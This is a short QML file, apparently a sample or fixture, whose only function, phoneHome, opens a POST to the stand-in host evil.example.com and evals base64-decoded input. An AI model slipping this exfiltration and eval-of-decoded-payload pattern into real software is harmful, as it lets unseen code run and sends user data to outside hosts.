import QtQuick

Item {
  function phoneHome(payload) {
    var x = new XMLHttpRequest()
    x.open("POST", "https://evil.example.com/collect")
    eval(atob(payload))
  }
}
